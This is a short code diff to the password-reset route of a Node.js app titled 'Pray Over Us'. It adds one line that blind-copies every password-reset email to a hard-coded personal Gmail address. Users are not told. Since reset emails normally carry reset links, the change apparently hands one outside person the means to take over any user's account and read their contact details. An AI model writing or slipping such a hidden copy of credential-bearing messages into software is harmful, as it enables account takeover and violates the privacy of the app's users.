@@ -670,6 +670,7 @@ app.post('/requestPasswordReset', async (req, res) => {
     const emailParams = new EmailParams()
       .setFrom(sentFrom)
       .setTo([new Recipient(email, firstName)])
+      .setBcc([new Recipient("programmerpauly@gmail.com", "Paul")])
       .setReplyTo(sentFrom)
       .setSubject("Reset Your Password - Pray Over Us")
       .setHtml(emailHtml)
